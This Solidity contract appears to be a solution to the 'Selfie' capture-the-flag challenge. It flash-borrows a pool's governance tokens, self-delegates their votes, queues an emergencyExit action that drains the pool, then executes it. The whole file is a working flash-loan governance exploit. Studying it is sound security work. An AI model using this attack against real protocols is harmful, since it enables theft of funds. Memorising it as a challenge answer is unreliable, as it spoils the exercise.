// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "../selfie/ISimpleGovernance.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

interface ISelfiePool {
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        returns (bool);
    function emergencyExit(address receiver) external;
}

interface IERC20Votes is IERC20 {
    function delegate(address delegatee) external;
}

contract AttackSelfie is IERC3156FlashBorrower {
    ISelfiePool private pool;
    ISimpleGovernance private governance;
    IERC20Votes private token;
    address private recovery;
    uint256 private actionId;

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = IERC20Votes(_token);
        recovery = _recovery;
    }

    function queueAttack() external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        token.delegate(address(this));

        bytes memory data = abi.encodeCall(ISelfiePool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAttack() external {
        governance.executeAction(actionId);
    }
}
